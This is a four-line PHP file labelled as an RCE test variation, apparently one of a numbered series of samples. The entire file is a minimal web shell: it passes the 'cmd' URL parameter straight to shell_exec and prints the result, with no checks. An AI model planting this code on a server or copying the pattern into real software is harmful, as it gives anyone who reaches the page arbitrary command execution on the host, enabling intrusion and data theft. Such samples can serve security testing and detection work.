<?php
// RCE test variation #649
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>